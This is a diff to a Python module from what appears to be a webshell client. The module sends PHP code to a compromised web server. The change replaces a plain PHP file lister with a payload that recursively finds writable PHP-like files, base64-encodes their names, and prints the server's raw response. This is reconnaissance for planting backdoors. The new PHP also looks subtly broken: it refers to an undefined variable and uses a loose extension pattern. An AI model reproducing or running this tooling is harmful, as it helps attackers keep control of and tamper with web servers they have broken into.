@@ -3,24 +3,24 @@ from libs.myapp import send, print_tree
 
 
 def get_php(file_path: str):
-    return """function listAllFiles($dir){
-    if(is_dir($dir)){
-        if($handle=opendir($dir)){
-            while(false!==($file=readdir($handle))){
-                if($file!="."&&$file!=".."){
-                    if(is_dir($dir."/".$file)){
-                        $files[$file]=listAllFiles($dir."/".$file);
-                    }else if(strtolower(end(explode('.', $file))) == "php"){
-                        $files[]=$dir."/".$file;
-                    }
-                }
-            }
-            closedir($handle);
+    return """function scan_rescursive($directory) {
+    global $cfgs;
+    $res = array();
+    foreach(glob("$directory/*") as $item) {
+        if(is_dir($item)) {
+            $items=explode('/', $item);
+            $folder = base64_encode(end($items));
+            $res[$folder] = scan_rescursive($item);
+            continue;
+        }
+        else if(preg_match('/ph*/i',end(explode('.', $file))) && is_writable($file)){
+            $res[] = base64_encode(basename($item));
         }
     }
-    return $files;
+    return $res;
 }
-print(json_encode(listAllFiles("%s")));""" % file_path
+print(json_encode(scan_rescursive("%s")));
+""" % file_path
 
 
 @alias(True, fp="file_path")
@@ -35,4 +35,6 @@ def run(web_file_path: str = ''):
     web_file_path = web_file_path if (len(web_file_path)) else gget("webshell.root", "webshell")
     php = get_php(web_file_path)
     file_tree = send(f'{php}').r_json
+    text = send(f'{php}').text
+    print(text)
     print_tree(web_file_path, file_tree)
